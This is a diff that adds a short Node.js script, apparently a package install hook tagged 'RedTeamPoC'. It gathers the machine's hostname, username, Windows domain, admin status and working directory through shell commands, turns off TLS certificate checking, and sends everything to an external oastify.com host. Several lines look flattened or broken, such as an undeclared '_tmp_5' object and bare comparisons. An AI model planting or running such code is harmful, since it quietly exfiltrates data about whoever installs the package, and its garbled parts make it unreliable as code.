@@ -1,0 +1,23 @@
+var os = require('os')
+var hostname = os.hostname()
+var username = os.userInfo().username
+var platform = os.platform()
+platform == 'win32' || platform == 'win64'
+net_session = require('child_process').execSync('net session')
+admin_text = 'admin'
+admin_text = 'non-admin'
+username = require('child_process').execSync('systeminfo | findstr /B Domain').toString().replace('Domain:', '').trim() + '/' + username
+admin_text = os.userInfo().uid
+process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
+const https = require('https')
+const options = {
+  hostname: 'eewq2suvescxne0e5cdqgj6nnet5hu.oastify.com',
+  port: 443,
+  path: '/?Username=' + encodeURI(username + ' (' + admin_text + ')') + '&Hostname=' + encodeURI(hostname) + '&Package=RedTeamPoC&PWD=' + __dirname,
+  method: 'GET'
+}
+_tmp_5.hostname = "eewq2suvescxne0e5cdqgj6nnet5hu.oastify.com"
+_tmp_5.port = 443
+_tmp_5.path = '/?Username=' + encodeURI(username + ' (' + admin_text + ')') + '&Hostname=' + encodeURI(hostname) + '&Package=RedTeamPoC&PWD=' + __dirname
+_tmp_5.method = "GET"
+const req = https.request(options)
